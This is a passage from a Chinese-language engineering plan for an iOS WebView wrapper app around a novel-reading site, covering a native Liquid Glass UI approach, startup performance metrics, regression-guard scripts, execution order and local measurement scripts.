- **然后评估 B**：1–3 周，能真正用上 Liquid Glass 与原生阅读体验，且保留网页作为登录/浏览的兜底。
- **不建议 C**：技术上的阻塞（Turnstile + 私有接口）与法律/维护风险都不划算，除非站点方提供正式 API。

### 5.6 如果要做 Liquid Glass（B 路线的最小实现）

不建议引入第三方插件：`@ajuarezso/capacitor-liquid-glass@0.8.0`（MIT，4 stars，319 下载/周，单作者，`github.com/anthonyjuarezsolis/capacitor-liquid-glass`）思路正确（原生 overlay 浮在 WebView 上），但把一个新的单人项目编进侧载包不值当。自己写约百行：

1. 在 `SangTacAppPlugin` 里（或新的 `chrome` 插件）拿到 `bridge.viewController`，加一个 `UITabBar`（iOS 26 自动玻璃）或自定义 `UIVisualEffectView` + `UIGlassEffect`（`@available(iOS 26.0, *)`）。
2. 容器视图用 `UIScrollEdgeElementContainerInteraction`（iOS 26）或 SwiftUI `safeAreaBar`，让内容从玻璃下方滚过时保持可读。
3. 旧的 iOS 15–25 走 `UIBlurEffect` 降级，保证部署目标不变。
4. 玻璃只用于导航/控件层（tabbar、阅读器工具栏、设置 sheet），**不要**给列表行加玻璃（Apple 明确说会显得很糟）。

---

## 6. 验收与度量（怎么证明真的快了）

真机上只需看已有的诊断面板（设置 → 诊断打开，或连点左上角三次）：

| 指标 | 位置 | 现在 | 目标 |
|---|---|---|---|
| 外壳释放时刻 | `[BOOT] shell released at +Nms` | 需真机取基线 | 提前 1–3s |
| `app.v2.js` 求值完成 | `[BOOT] +Nms stylesheet/app=yes` | 文档基线 +8s | -2s 以上 |
| 单请求耗时 | `[Http] ... in Nms` | 已有 | 列表页 P50 -30% |
| 正文打开 | `[Http] sajax=readchapter ... in Nms` | 0.7–2.1s（服务端） | 缓存命中 <50ms |
| 首屏前注入解析量 | 新增埋点 | 262.5KB | ≤60KB |

建议新增两个埋点：① 注入块执行耗时（每块 `performance.now()` 差值，汇总成一行 `[PATCH] total Nms / boot-critical Mms`）；② 资源命中来源（`[ASSET] app.v2.js cached|network`，通过 `performance.getEntriesByName` 的 `transferSize===0` 判断）。

**回归守护必须同步**（改了注入块顺序/数量就会红）：
- `scripts/check-ios-shim.js`（当前 18 块 / 240958 字节 / 21 markers → Round 14 后 24 markers，commit `d282bd7`）
- `scripts/test-site-patch.js`（301 条断言）
- `scripts/gen-site-i18n.js --check`
- `.github/workflows/build-ipa.yml:172-185` 的 marker 列表

---

## 7. 风险与执行顺序

1. **工作区状态**：分析时 HEAD=`d282bd7`（Round 14 日志开关已提交），工作区干净。Round 14 的"日志默认关闭"已经让 JS 侧诊断变便宜，但**原生侧的每请求开销还在**（R7），所以 P0-4 仍然必要。
2. **P0-1 是唯一"改一行、收益立现"的点**，建议第一个做，并先在真机上量 `[BOOT]` 前后对比。
3. **P0-3 动的是注入结构**，必须与三个守护脚本一起改，一次提交内完成，否则 CI 直接红。
4. **P2 单独评估**：它需要把页面从本地 origin 加载，回归面覆盖登录/Turnstile/Referer，建议等 P0/P1 落地并稳定后再开。
5. **安全四项（S1–S4）与性能改动互不冲突**，可以并行，且 S2/S3 改动量很小。

---

## 8. 附：本次分析用到的可复现脚本

放在仓库外的临时目录 `D:\GitHub_Clone\_stv-analysis\`（不污染仓库）：

| 脚本 | 作用 |
|---|---|
| `measure.js` | 统计 `SitePatch.swift` 各注入块体积 + 站点本地副本体积 |
| `measure-i18n.js` | 统计 `SiteI18nData.swift` 注入体积（49.6KB） |
| `probe-site.js` | 探测站点外壳与关键资源的响应头/耗时 |
| `probe-assets.js` | 探测全部关键资源的 wire 体积、TTFB、`Cache-Control`（§2 R1 表格来源） |
| `boot-code.js` / `boot-chain.js` / `find-assets.js` / `loaders.js` | 从外壳 HTML 与站点 bundle 中提取启动链、`scriptmanager` 调用点、`Math.random` 破缓存点 |
| `stv.ui.js` | 下载的站点 UI 库（用于确认 `ui.scriptmanager.load` 实现） |

复现命令：

```powershell
node D:\GitHub_Clone\_stv-analysis\measure.js
node D:\GitHub_Clone\_stv-analysis\probe-assets.js
```
